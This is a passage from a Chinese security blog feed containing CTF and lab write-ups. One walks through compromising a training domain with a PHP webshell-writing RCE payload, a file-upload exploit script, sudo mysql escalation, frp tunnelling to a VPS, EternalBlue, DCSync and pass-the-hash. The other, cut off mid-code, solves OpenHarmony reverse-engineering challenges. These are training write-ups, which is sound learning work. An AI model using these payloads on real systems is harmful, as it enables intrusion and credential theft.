maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">_method=__construct&amp;filter[]=<span class="hljs-built_in">system</span>&amp;<span class="hljs-built_in">method</span>=<span class="hljs-built_in">get</span>&amp;server[REQUEST_METHOD]=echo &#x27;%3C%3Fphp+%40eval%<span class="hljs-number">28</span>%24_POST%<span class="hljs-number">5B1</span>%5D%<span class="hljs-number">29</span>%3B%3F%3E&#x27; &gt;shell.php<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/607aabb350b45f53.png" alt="image-20250718043440601"></p><p>èšå‰‘è¿æ¥ï¼Œå‘ç° sudo -l æœ‰ mysql ï¼Œç”¨ mysql ææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql -e <span class="hljs-string">&#x27;\! /bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/eae599b9a5466ee3.png" alt="image-20250718013242819"></p><p>æ‹¿åˆ° flag01</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">60b53231</span>-<br></code></pre></td></tr></table></figure><h1 id="å†…ç½‘æ‰«æ"><a href="#å†…ç½‘æ‰«æ" class="headerlink" title="å†…ç½‘æ‰«æ"></a>å†…ç½‘æ‰«æ</h1><p>é¶æœº IP ä¸º </p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.15</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/28ec61a9315a1650.png" alt="image-20250718014053058"></p><p>ä¼  fscan æ‰«å†…ç½‘</p><p><img src="https://img.dkdun.cn/v1/2025/12/2047f20b4fee62f4.png" alt="image-20250718015050474"></p><p>å¯ä»¥å¾—å‡ºä»¥ä¸‹ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">xiaorang.lab åŸŸ<br>172.22.1.2  DC01 åŸŸæ§<br>172.22.1.18  ä¿¡å‘¼ OA<br>172.22.1.21 å­˜åœ¨ MS17-010 æ¼æ´ <br></code></pre></td></tr></table></figure><h1 id="frp-æµé‡è½¬å‘"><a href="#frp-æµé‡è½¬å‘" class="headerlink" title="frp æµé‡è½¬å‘"></a>frp æµé‡è½¬å‘</h1><p>ä¸Šä¼  frp æŠŠå†…ç½‘ä¸­çš„æµé‡è½¬å‘å‡ºæ¥ï¼Œä¸Šä¼  frps å’Œ frps.ini åˆ° vpsï¼Œfrpc å’Œ frpc.ini åˆ°é¶æœº</p><p>vps å…ˆæ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frps -c frps.ini<br></code></pre></td></tr></table></figure><p>é¶æœºæ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frpc -c frpc.ini<br></code></pre></td></tr></table></figure><p>å·²ç»è½¬å‘å‡ºæ¥äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/c87734de4285881e.png" alt="image-20250718030001184"></p><p>é…ç½® proxfixerï¼Œé…ç½®å…¨å±€ä»£ç†</p><p><img src="https://img.dkdun.cn/v1/2025/12/21c92b3702bf7f09.png" alt="image-20250718030348756"></p><p>ä¹Ÿå¯ä»¥ç”¨ <a href="chrome-extension://padekgcemlokbadohgkifijomclgjgif/options.html#!/about">SwitchyOmega</a>ï¼Œæ„Ÿè§‰è¿™ä¸ªæ›´æ–¹ä¾¿</p><h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><p>è®¿é—® 172.22.1.18 æ˜¯ä¸€ä¸ªä¿¡å‘¼çš„ OA ç³»ç»Ÿï¼Œå¯ä»¥å¼±å£ä»¤ admin:admin123 ç™»å½•ç³»ç»Ÿï¼Œç³»ç»Ÿå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ŒåŒ exp ç›®å½•ä¸‹åˆ›å»º webshell æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œ exp è‡ªåŠ¨ä¸Šä¼ åŠ è½½è·¯å¾„</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">session</span> = requests.<span class="hljs-keyword">session</span>()<br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br># url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br><br>r = <span class="hljs-keyword">session</span>.post(url1, data=data1)<br>r = <span class="hljs-keyword">session</span>.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br><br>filepath = str(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = &quot;/&quot; + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.php&#x27;</span><br>id = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br>url3 = url_pre + f<span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br>r = <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(url3)<br>r = <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(url_pre + filepath + &quot;?1=system(&#x27;dir&quot;)<br>print(r.text)<br>print(filepath)<br></code></pre></td></tr></table></figure><p>åŠ è½½å‡ºè·¯å¾„</p><p><img src="https://img.dkdun.cn/v1/2025/12/ca2d3a4648abee02.png" alt="image-20250718205453954"></p><p>èšå‰‘è¿æ¥ï¼Œåœ¨ Administrator  ç”¨æˆ·çš„ç›®å½•ä¸‹æ‹¿åˆ° flag2</p><p><img src="https://img.dkdun.cn/v1/2025/12/8d1399da7d60e1a8.png" alt="image-20250718194206150"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: <span class="hljs-number">2</span>ce3-<span class="hljs-number">4813</span>-<span class="hljs-number">87</span>d4-<br></code></pre></td></tr></table></figure><h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><p>å¯¹ 172.22.1.21 è¿›è¡Œæ°¸æ’ä¹‹è“æ”»å‡»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br>search ms17-010<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhosts 172.22.1.21<br>run<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° shellï¼Œä¹‹åè°ƒç”¨ mimikatz çš„ kiwi æ¨¡å—æ¨ªå‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">load kiwi<br>kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f7548133109a3a9b.png" alt="image-20250718203336451"></p><p>è¿›è¡Œ DCSync æ”»å‡»ï¼Œæ‹¿åˆ°åŸŸæ§ hash</p><p>æ‹¿ Administrator ç”¨æˆ·çš„ hashï¼Œç„¶åä½¿ç”¨  crackmapexec è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œå®ç° DC åŸŸæ§ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œè·å– flag3</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">proxychains crackmapexec smb <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span> -u administrator -H<span class="hljs-number">10</span>cf<span class="hljs-number">89</span>a<span class="hljs-number">850</span>fb<span class="hljs-number">1</span>cdbe<span class="hljs-number">6</span>bb<span class="hljs-number">432</span>b<span class="hljs-number">859164</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span> -d xiaorang.lab -<span class="hljs-keyword">x</span> <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/4b49f1d865d0d44e.png" alt="image-20250718203112160"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">flag03:</span> e8f88d0d43d6&#125;<br></code></pre></td></tr></table></figure><p>å®Œæ•´ flag </p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">60b53231</span>-2ce3-<span class="hljs-number">4813</span>-87d4-e8f88d0d43d6&#125;<br></code></pre></td></tr></table></figure><h1 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h1><p>å‚è€ƒ <a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">åŸŸæ¸—é€-DCSync</a></p><p>DCSync æ˜¯åˆ©ç”¨ <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47">DRS(Directory Replication Service)</a> åè®®é€šè¿‡ IDL_DRSGetNCChanges ä»åŸŸæ§åˆ¶å™¨å¤åˆ¶ç”¨æˆ·å‡­æ®ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ DCSync æ¥å¯¼å‡ºæ‰€æœ‰ç”¨æˆ·çš„ hash ç„¶åè¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»</p><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><p>è·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Administratorsç»„å†…çš„ç”¨æˆ·<br><span class="hljs-built_in">Domain</span> Adminsç»„å†…çš„ç”¨æˆ·<br>Enterprise Adminsç»„å†…çš„ç”¨æˆ·<br>åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœº<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>æ˜¥ç§‹äº‘é•œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†…ç½‘æ¸—é€ DCSync MS17-010</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬ä¸€å±ŠOpenHarmony CTFä¸“é¢˜èµ›</title>
    <link href="/2025/07/17/%E7%AC%AC%E4%B8%80%E5%B1%8AOpenHarmony-CTF%E4%B8%93%E9%A2%98%E8%B5%9B/"/>
    <url>/2025/07/17/%E7%AC%AC%E4%B8%80%E5%B1%8AOpenHarmony-CTF%E4%B8%93%E9%A2%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>å°† hap æ–‡ä»¶è§£å‹ï¼ŒæŠŠ ets ç›®å½•ä¸‹çš„ modules.abc å­—èŠ‚ç æ–‡ä»¶ä¸¢å…¥ abc-decompiler åç¼–è¯‘</p><p><img src="https://img.dkdun.cn/v1/2025/12/2a9e4d9bd327c449.png" alt="image-20250714163817762"></p><p>åœ¨ pages&#x2F;Index æ‹¿åˆ°å¯†æ–‡ hint1ï¼Œå¾€ä¸‹ç¿»çœ‹åˆ°åŠ å¯†é€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">1</span>&gt;@<span class="hljs-number">2</span>*^<span class="hljs-number">2</span>*#(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>) &#123;<br>    i = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i2 = <span class="hljs-number">0</span>; (i2 &lt; _lexenv_0_1_.hint1.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i2 = tonumer(i2) + <span class="hljs-number">1</span>) &#123;<br>        obj = String.fromCharCode;<br>        obj2 = _lexenv_0_1_.hint1;<br>        i += obj(obj2.charCodeAt(i2) + _lexenv_0_1_.hint1.length);<br>    &#125;<br>    ldlexvar = _lexenv_0_1_;<br>    reverseStr = ldlexvar.reverseStr(i);<br>    i3 = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i4 = <span class="hljs-number">0</span>; (i4 &lt; _lexenv_0_1_.hint1.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i4 = tonumer(i4) + <span class="hljs-number">1</span>) &#123;<br>        i3 += String.fromCharCode(reverseStr.charCodeAt(i4) - i4);<br>    &#125;<br>    ldlexvar2 = _lexenv_0_1_;<br>    reverseStr2 = ldlexvar2.reverseStr(i3);<br>    obj3 = createobjectwithbuffer([<span class="hljs-string">&quot;hint1&quot;</span>, <span class="hljs-number">0</span>]);<br>    obj3.hint1 = reverseStr2;<br>    router = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as router &#125; from <span class="hljs-string">&quot;@ohos:router&quot;</span>;<br>    obj4 = router.pushUrl;<br>    obj5 = createobjectwithbuffer([<span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;pages/Flag&quot;</span>, <span class="hljs-string">&quot;params&quot;</span>, <span class="hljs-number">0</span>]);<br>    obj5.params = obj3;<br>    callthisN = obj4(obj5);<br>    then = callthisN.then();<br>    then.<span class="hljs-keyword">catch</span>(#~@<span class="hljs-number">1</span>&gt;@<span class="hljs-number">2</span>*^<span class="hljs-number">2</span>**#);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">1</span>&gt;#reverseStr(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    obj = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i = arg0.length - <span class="hljs-number">1</span>; (i &gt;= <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i = tonumer(i) - <span class="hljs-number">1</span>) &#123;<br>        obj = (obj == <span class="hljs-literal">true</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) + arg0[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å…ˆå°† hint1 Reverseï¼Œç„¶ååŠ  Length å†å‡ Indexï¼Œæœ€åå† Reverseï¼Œæœ€ç»ˆç»“æœ <code>finalHint</code> è¢«èµ‹å€¼ç»™ <code>obj3.hint1</code>ï¼Œä½œä¸ºå‚æ•°ä¼ ç»™ <code>pages/Flag</code></p><p>åœ¨ Flag ä¸­å‘ç° magic çš„å€¼ï¼Œç¬¬äºŒæ®µ flag </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>=#Flag(Object functionObject, Object newTarget, Flag <span class="hljs-built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;<br>    obj = arg3;<br>    obj2 = arg4;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">0</span> == obj ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj = -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">0</span> == obj2 ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj2 = <span class="hljs-literal">null</span>;<br>    &#125;<br>    obj3 = <span class="hljs-built_in">super</span>(arg0, arg2, obj, arg5);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-string">&quot;function&quot;</span> == typeof(obj2) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj3.paramsGenerator_ = obj2;<br>    &#125;<br>    obj3.__message = ObservedPropertySimplePU(<span class="hljs-string">&quot;Click 1000000 times to get the flag&quot;</span>, obj3, <span class="hljs-string">&quot;message&quot;</span>);<br>    obj3.count = <span class="hljs-number">0</span>;<br>    obj3.magic = <span class="hljs-string">&quot;ODg0ZjMxNWYxMDJiMGI4ZGI1NjgwNWYzNGJkYzgxY2ZlYzI&quot;</span>;<br>    obj3.setInitiallyProvidedValue(arg1);<br>    obj3.finalizeConstruction();<br>    <span class="hljs-keyword">return</span> obj3;<br>&#125;<br><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#getH2(Object functionObject, Object newTarget, Flag <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span> &#123; decodeToString &#125; from <span class="hljs-string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/utils/Coder&amp;&quot;</span>(arg0);<br>&#125;<span class="hljs-comment">// baseè§£å¯†</span><br><br><br><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;@<span class="hljs-number">1</span>*^<span class="hljs-number">2</span>*#(Object functionObject, Object newTarget, Flag <span class="hljs-built_in">this</span>) &#123;<br>    ldlexvar = _lexenv_0_1_;<br>    ldlexvar.count = tonumer(ldlexvar.count) + <span class="hljs-number">1</span>;<br>    router = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as router &#125; from <span class="hljs-string">&quot;@ohos:router&quot;</span>;<br>    r14 = router.getParams().hint1;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-number">1000000</span> == _lexenv_0_1_.count ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>) &#123;<br>        promptAction = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as promptAction &#125; from <span class="hljs-string">&quot;@ohos:promptAction&quot;</span>;<br>        obj = promptAction.showToast;<br>        obj2 = createobjectwithbuffer([<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;duration&quot;</span>, <span class="hljs-number">2000</span>]);<br>        obj2.message = _lexenv_0_1_.count + <span class="hljs-string">&quot;&quot;</span>;<br>        obj(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    ldlexvar2 = _lexenv_0_1_;<br>    getH2 = r14 + ldlexvar2.getH2(_lexenv_0_1_.magic);<br>    promptAction2 = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as promptAction &#125; from <span class="hljs-string">&quot;@ohos:promptAction&quot;</span>;<br>    obj3 = promptAction2.showToast;<br>    obj4 = createobjectwithbuffer([<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;duration&quot;</span>, <span class="hljs-number">2000</span>]);<br>    obj4.message = <span class="hljs-string">&quot;The flag is flag&#123;&quot;</span> + getH2 + <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    obj3(obj4);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æœ€å flag &#x3D; r14 ï¼‹ reverse(decode_magic) ï¼Œæ‰€ä»¥å¯ä»¥å¾—å‡ºé€†å‘è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_hint1</span>(<span class="hljs-params">cipher: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    length = <span class="hljs-built_in">len</span>(cipher)<br>    <span class="hljs-comment"># charCode + lengthï¼ŒRevese</span><br>    step1 = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) + length) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher])<br>    reverse1 = step1[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># charCode - index</span><br>    step3 = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(reverse1[i]) - i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(reverse1))])<br>    <span class="hljs-comment"># Reverse</span><br>    decrypted = step3[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> decrypted<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_magic</span>(<span class="hljs-params">magic</span>):<br>    padding = <span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(magic) % <span class="hljs-number">4</span><br>    <span class="hljs-keyword">if</span> padding != <span class="hljs-number">4</span>:<br>        magic += <span class="hljs-string">&#x27;=&#x27;</span> * padding<br>    decrypted = base64.b64decode(magic).decode()<br>    <span class="hljs-comment"># Reverse</span><br>    decrypted = decrypted[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> decrypted<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    hint1 = <span class="hljs-string">&quot;opfj^_mgekc]iWccXbf&quot;</span><br>    magic = <span class="hljs-string">&quot;ODg0ZjMxNWYxMDJiMGI4ZGI1NjgwNWYzNGJkYzgxY2ZlYzI&quot;</span><br><br>    decrypt_hint1 = decode_hint1(hint1)<br>    decrypt_magic = decode_magic(magic)<br><br>    flag = <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;decrypt_hint1&#125;</span><span class="hljs-subst">&#123;decrypt_magic&#125;</span>&#125;&#125;&quot;</span><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-built_in">print</span>(get_flag())<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flagï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;princetonuniversity2cefc18cdb43f50865bd8b0b201f<span class="hljs-number">513f488</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="arkts"><a href="#arkts" class="headerlink" title="arkts"></a>arkts</h2><p>åˆ†ææºç å¤§æ¦‚å¯ä»¥çŸ¥é“ enc å…ˆ rc4  å† rsa ç„¶å base64 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#enc(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    rsaEncrypt = <span class="hljs-built_in">this</span>.rsaEncrypt(<span class="hljs-built_in">this</span>.rc4Encrypt(<span class="hljs-built_in">this</span>.secretKey, arg0));<br>    objArr = [Object];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; (i &lt; rsaEncrypt.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i = tonumer(i) + <span class="hljs-number">1</span>) &#123;<br>        obj = <span class="hljs-built_in">this</span>.customBase64;<br>        obj2 